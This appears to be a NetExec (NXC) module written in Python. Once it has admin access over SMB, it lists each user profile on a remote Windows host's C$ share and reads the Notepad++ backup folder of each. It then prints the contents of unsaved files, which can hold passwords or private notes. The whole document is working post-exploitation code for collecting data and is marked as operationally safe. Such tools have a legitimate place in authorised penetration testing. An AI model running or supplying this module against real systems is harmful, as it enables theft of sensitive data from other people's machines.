# Finds Notepad++ unsaved and backed up files
# Module by @Defte_
from io import BytesIO

class NXCModule:
    name = "notepad++"
    description = "Extracts notepad++ unsaved files."
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True
    false_positive = [".", "..", "desktop.ini", "Public", "Default", "Default User", "All Users", ".NET v4.5", ".NET v4.5 Classic"]

    def options(self, context, module_options):
        """ """

    def on_admin_login(self, context, connection):
        for directory in connection.conn.listPath("C$",  "Users\\*"):
            if directory.get_longname() not in self.false_positive and directory.is_directory() > 0:
                try:
                    for file in connection.conn.listPath("C$", f"Users\\{directory.get_longname()}\\AppData\\Roaming\\Notepad++\\backup\\*"):
                        if file.get_longname() not in self.false_positive:
                            file_path = f"Users\\{directory.get_longname()}\\AppData\\Roaming\\Notepad++\\backup\\{file.get_longname()}"
                            context.log.highlight(f"C:\\{file_path}")
                            buf = BytesIO()
                            connection.conn.getFile("C$", file_path, buf.write)
                            buf.seek(0)
                            file_content = buf.read().decode("utf-8", errors="ignore")                               
                            context.log.highlight(f"\t{file_content}")            
                except Exception:
                    pass        
